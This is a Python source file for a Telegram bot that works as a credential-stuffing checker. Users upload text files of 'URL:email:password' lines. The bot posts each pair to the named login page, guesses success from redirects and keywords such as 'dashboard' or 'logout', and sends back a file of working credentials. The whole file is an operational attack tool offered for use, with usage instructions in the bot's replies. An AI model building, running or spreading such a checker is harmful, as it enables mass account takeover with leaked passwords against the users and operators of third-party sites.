import os
import asyncio
import aiohttp
import threading
from flask import Flask, request
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

# --- CONFIGURATION ---
TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
ALLOWED_USER_ID = os.getenv("ALLOWED_USER_ID")
WEBAPP_URL = os.getenv("WEBAPP_URL")
PORT = int(os.environ.get("PORT", 8080))

app = Flask(__name__)

# Global flag to prevent multiple simultaneous jobs
IS_PROCESSING = False

# --- SECURITY CHECK ---
def is_allowed(user_id):
    if not ALLOWED_USER_ID:
        return True
    allowed_ids = ALLOWED_USER_ID.split(',')
    return str(user_id) in allowed_ids

# --- PARSING LOGIC ---
def parse_line(line):
    line = line.strip()
    if not line or line.startswith('#'):
        return None
    try:
        colon_indices = [i for i, char in enumerate(line) if char == ':']
        if len(colon_indices) < 2:
            return None
        last_colon = colon_indices[-1]
        second_last_colon = colon_indices[-2]
        password = line[last_colon + 1:]
        username_email = line[second_last_colon + 1:last_colon]
        url_part = line[:second_last_colon]
        if not url_part.startswith('http://') and not url_part.startswith('https://'):
            url_part = 'https://' + url_part
        if not username_email or not password:
            return None
        return (url_part, username_email, password)
    except Exception:
        return None

# --- CHECKING LOGIC ---
async def check_single_credential(session, url, user, password):
    try:
        payload = {
            "email": user,
            "username": user,
            "user": user,
            "login": user,
            "password": password
        }
        async with session.post(url, data=payload, allow_redirects=False, timeout=10) as response:
            status = response.status
            text = ""
            try:
                text = (await response.text()).lower()
            except:
                pass
            
            fail_terms = ["invalid", "incorrect", "failed", "error", "wrong", "unauthorized", "forbidden", "captcha", "verification"]
            success_terms = ["welcome", "dashboard", "success", "token", "session", "logout", "account", "profile", "home"]
            
            has_fail = any(term in text for term in fail_terms)
            has_success = any(term in text for term in success_terms)
            
            if has_fail:
                return False
            if has_success:
                return True
            if status in [301, 302, 303]:
                return True
            return False
    except Exception:
        return False

async def process_file_task(chat_id, file_path, context):
    global IS_PROCESSING
    valid_results = []
    
    try:
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            lines = f.readlines()
    except Exception as e:
        IS_PROCESSING = False
        try:
            await context.bot.send_message(chat_id=chat_id, text="❌ Error reading file.")
        except:
            pass
        if os.path.exists(file_path):
            os.remove(file_path)
        return

    total_lines = len(lines)
    if total_lines == 0:
        IS_PROCESSING = False
        try:
            await context.bot.send_message(chat_id=chat_id, text="❌ The file is empty.")
        except:
            pass
        return

    try:
        await context.bot.send_message(
            chat_id=chat_id, 
            text=f"⚙️ **Process Started**\n\nTotal lines to check: {total_lines}\n\nI will send progress updates every 5%. Please wait...",
            parse_mode='Markdown'
        )
    except:
        pass

    connector = aiohttp.TCPConnector(limit=20)
    async with aiohttp.ClientSession(connector=connector) as session:
        count = 0
        valid_count = 0
        last_progress_report = 0
        
        for line in lines:
            parsed = parse_line(line)
            if parsed:
                url, user, passw = parsed
                is_valid = await check_single_credential(session, url, user, passw)
                if is_valid:
                    valid_results.append(f"{url}:{user}:{passw}")
                    valid_count += 1
            
            count += 1
            progress_percent = int((count / total_lines) * 100)
            
            if progress_percent >= last_progress_report + 5 or count == total_lines:
                last_progress_report = progress_percent
                try:
                    await context.bot.send_message(
                        chat_id=chat_id, 
                        text=f"⏳ **Progress Update**\n\nChecked: {count}/{total_lines}\nProgress: {progress_percent}%\nValid Found So Far: {valid_count}\n\n*Please do not send another file until this process is complete.*",
                        parse_mode='Markdown'
                    )
                except:
                    pass

    IS_PROCESSING = False
    if valid_results:
        filename = "valid_credentials.txt"
        with open(filename, 'w') as f:
            f.write("\n".join(valid_results))
        
        try:
            await context.bot.send_document(
                chat_id=chat_id,
                document=open(filename, 'rb'),
                caption=f"✅ **Process Complete!**\n\n"
                        f"📊 **Summary:**\n"
                        f"- Total Lines Checked: {count}\n"
                        f"- **Valid Credentials Found: {valid_count}**\n"
                        f"- Invalid/Skipped: {count - valid_count}\n\n"
                        f"📄 Download the file below for the valid list.",
                parse_mode='Markdown'
            )
        except:
            pass
        if os.path.exists(filename):
            os.remove(filename)
    else:
        try:
            await context.bot.send_message(
                chat_id=chat_id, 
                text=f"🛑 **Process Complete**\n\n"
                     f"📊 **Summary:**\n"
                     f"- Total Lines Checked: {count}\n"
                     f"- **Valid Credentials Found: 0**\n\n"
                     f"No valid credentials were found.",
                parse_mode='Markdown'
            )
        except:
            pass

    if os.path.exists(file_path):
        os.remove(file_path)

# --- TELEGRAM HANDLERS ---
async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_allowed(update.message.from_user.id):
        return
    await update.message.reply_text(
        "👨‍💻 **Credential Checker Bot**\n\n"
        "I can validate thousands of credentials from a text file and return only the working ones.\n\n"
        "**How to use:**\n"
        "1. Prepare a `.txt` file with credentials in this format:\n"
        "   `https://site.com/login:email:password`\n"
        "2. Send the file to this chat.\n"
        "3. I will process it and send back a new file with **ONLY** valid credentials.\n\n"
        "⚠️ **Note:**\n"
        "- Progress updates will be sent every 5%.\n"
        "- Do not send multiple files at once.",
        parse_mode='Markdown'
    )

async def commands_list(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_allowed(update.message.from_user.id):
        return
    await update.message.reply_text(
        "📜 **Available Commands:**\n\n"
        "/start - Start the bot and see instructions.\n"
        "/commands - Show this list of commands.\n"
        "/help - Get help and usage information.\n\n"
        "📂 **To check credentials:** Just send a `.txt` file directly to the chat."
    )

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_allowed(update.message.from_user.id):
        return
    await update.message.reply_text(
        "🆘 **Help & Usage**\n\n"
        "1. Create a text file with your credential list.\n"
        "2. Format must be `URL:username:password`.\n"
        "3. Send the file to me.\n"
        "4. Wait for the progress updates.\n"
        "5. Download the result file containing only valid credentials."
    )

async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global IS_PROCESSING
    if not is_allowed(update.message.from_user.id):
        return
    if IS_PROCESSING:
        await update.message.reply_text("⚠️ **Busy!** I am currently processing another file. Please wait.")
        return
    document = update.message.document
    if not document.file_name.endswith('.txt'):
        await update.message.reply_text("❌ Invalid file type. Please send a `.txt` file only.")
        return
    file = await context.bot.get_file(document.file_id)
    file_path = "input_credentials.txt"
    try:
        await file.download_to_drive(file_path)
    except Exception as e:
        await update.message.reply_text(f"❌ Failed to download file: {str(e)}")
        return
    IS_PROCESSING = True
    await update.message.reply_text("📥 File received. Starting validation process...")
    asyncio.create_task(process_file_task(update.message.chat_id, file_path, context))

# --- WEBHOOK SETUP FOR RENDER ---
# FIXED: Changed 'method' to 'methods'
@app.route('/' + TOKEN, methods=['POST'])
def telegram_webhook():
    update = Update.de_json(request.get_json(force=True), application.bot)
    asyncio.create_task(application.process_update(update))
    return 'OK'

# --- FLASK MAIN ROUTE (Health Check) ---
@app.route('/')
def home():
    return "Bot is running and healthy.", 200

# --- MAIN EXECUTION ---
if __name__ == '__main__':
    if not TOKEN:
        print("CRITICAL ERROR: TELEGRAM_BOT_TOKEN is not set.")
        app.run(host='0.0.0.0', port=PORT)
        exit(1)

    if not WEBAPP_URL:
        print("CRITICAL ERROR: WEBAPP_URL environment variable is not set. The bot will not work.")
        # We still run the server so Render doesn't crash, but the bot won't function
        app.run(host='0.0.0.0', port=PORT)
        exit(1)

    print("🚀 Setting up Telegram Bot with Webhooks...")
    
    # Initialize the application
    application = Application.builder().token(TOKEN).build()
    
    # Register Handlers
    application.add_handler(CommandHandler("start", start_command))
    application.add_handler(CommandHandler("commands", commands_list))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(MessageHandler(filters.Document.ALL, handle_document))
    application.add_handler(MessageHandler(filters.TEXT, start_command))
    
    # Set Webhook
    webhook_url = f"{WEBAPP_URL}/{TOKEN}"
    try:
        asyncio.run(application.bot.set_webhook(webhook_url))
        print(f"✅ Webhook set to: {webhook_url}")
    except Exception as e:
        print(f"❌ Failed to set webhook: {e}")
        print("Make sure WEBAPP_URL is correct and the domain is accessible.")
    
    # Start Flask to listen for Telegram updates
    print(f"🚀 Starting Flask server on port {PORT}")
    app.run(host='0.0.0.0', port=PORT)
